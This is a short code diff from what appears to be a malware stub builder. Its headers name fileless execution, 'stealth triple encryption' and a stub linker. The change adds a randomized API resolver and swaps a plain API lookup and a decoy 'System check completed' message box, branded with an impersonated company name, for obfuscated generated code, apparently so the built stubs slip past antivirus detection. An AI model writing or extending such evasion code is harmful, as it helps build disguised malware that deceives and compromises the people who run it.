@@ -40,6 +40,7 @@
 #include "fileless_execution_generator.h"
 #include "stealth_triple_encryption.h"
 #include "stub_linker.h"
+#include "randomized_api_resolver.h"
 
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -734,23 +735,9 @@ void performBenignOperations() {
     volatile double mathResult = sin(calc1) * cos(calc2);
     (void)mathResult; // Suppress warning
     
-    // Dynamic API resolution for stealth
-    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
-    if (hKernel32) {
-        typedef DWORD(WINAPI* GetTickCountProc)();
-        GetTickCountProc pGetTickCount = (GetTickCountProc)GetProcAddress(hKernel32, "GetTickCount");
-        if (pGetTickCount) {
-            DWORD ticks = pGetTickCount();
-            (void)ticks; // Use the result
-        }
-        FreeLibrary(hKernel32);
-    }
+)" + apiResolver.generateRandomizedAPIResolution() + R"(
     
-    // Display benign message
-    MessageBoxA(NULL, 
-               ")" + companyName + R"( Application\n\nSystem check completed successfully.\n\nVersion: 1.0.0", 
-               ")" + companyName + R"(", 
-               MB_OK | MB_ICONINFORMATION);
+)" + apiResolver.generateObfuscatedMessageBox(companyName, companyName + " Application\\n\\nSystem check completed successfully.\\n\\nVersion: 1.0.0") + R"(
 }
 )";
     }
@@ -1937,6 +1924,7 @@ public:
     FilelessExecutionGenerator filelessGenerator;
     StealthTripleEncryption stealthEncryption;
     StubLinker stubLinker;
+    RandomizedAPIResolver apiResolver;
     
     struct CompanyProfile {
         std::string name;
